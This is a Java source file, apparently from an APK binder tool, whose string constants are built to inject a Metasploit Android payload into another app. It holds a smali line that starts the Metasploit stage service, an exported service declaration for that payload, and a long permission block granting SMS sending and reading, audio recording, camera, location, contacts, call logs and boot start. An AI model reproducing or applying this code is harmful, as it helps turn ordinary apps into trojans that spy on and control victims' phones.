package binder.main;

public class StaticString {
	public static String Payload = "\r\n\r\n	invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V\r\n";
	public static String serviceFlag = "<service android:exported=\"true\" android:name=\"com.metasploit.stage.MainService\"/>\r\n";
	public static String permission = "    <uses-permission android:name=\"android.permission.INTERNET\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.SEND_SMS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.CAMERA\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.READ_SMS\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>\r\n" + 
			"    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\r\n" + 
			"    <uses-feature android:name=\"android.hardware.camera\"/>\r\n" + 
			"    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>\r\n" + 
			"    <uses-feature android:name=\"android.hardware.microphone\"/>\r\n";

}
